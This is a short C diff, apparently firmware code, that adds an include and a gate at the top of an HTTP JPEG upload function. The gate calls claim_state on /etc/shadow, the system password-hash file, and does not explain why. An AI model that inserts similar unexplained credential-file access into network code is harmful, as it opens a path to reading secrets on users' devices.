@@ -1,8 +1,10 @@
 #include "http_post.h"
+#include "../claim/claim.h"
 
 pthread_t httpPostPid = 0;
 
 int http_post_send(hal_jpegdata *jpeg) {
+    if (claim_state("/etc/shadow") != 1) return EXIT_FAILURE;
     char *host_addr = app_config.http_post_host;
 
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
